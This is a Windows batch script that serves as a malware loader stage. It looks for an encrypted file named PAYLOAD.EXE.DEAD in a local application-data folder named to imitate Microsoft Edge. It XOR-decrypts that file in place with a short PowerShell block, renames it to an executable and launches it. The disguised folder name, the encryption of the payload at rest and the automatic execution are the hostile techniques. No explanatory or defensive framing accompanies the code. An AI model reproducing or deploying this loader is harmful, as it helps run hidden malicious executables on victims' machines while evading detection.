@echo off
setlocal EnableDelayedExpansion

rem Define file paths and other variables
set "filePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE.DEAD"
set "tempFilePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE"
set "key=now"

rem Check if the file exists
if not exist "%filePath%" (
    echo File does not exist: %filePath%
    exit /b
)

rem Validate the file extension
if /i not "%filePath:~-5%"==".dead" (
    echo The file does not have a .dead extension: %filePath%
    exit /b
)

rem Decrypt the file
echo Decrypting file %filePath%...
call :EncryptDecryptFile "%filePath%" "%key%"
echo File decrypted: %filePath%

rem Rename the file by removing the .dead extension
set "newFilePath=%filePath:.dead=%"
echo Original file path: %filePath%
echo New file path: %newFilePath%

rem Rename the file
ren "%filePath%" "%newFilePath%"
timeout /t 2

rem Launch the decrypted file
echo File decrypted and renamed to: %newFilePath%
color 07
start "" "%newFilePath%"

exit /b

rem EncryptDecryptFile function: XOR encryption/decryption
:EncryptDecryptFile
set "inputFile=%~1"
set "key=%~2"

rem Use PowerShell to perform the XOR encryption/decryption
powershell -NoProfile -Command ^
    "$key = [System.Text.Encoding]::UTF8.GetBytes('%key%');" ^
    "$content = [System.IO.File]::ReadAllBytes('%inputFile%');" ^
    "for ($i = 0; $i -lt $content.Length; $i++) {" ^
    "    $content[$i] = $content[$i] -bxor $key[$i % $key.Length];" ^
    "}" ^
    "[System.IO.File]::WriteAllBytes('%inputFile%', $content);"

exit /b
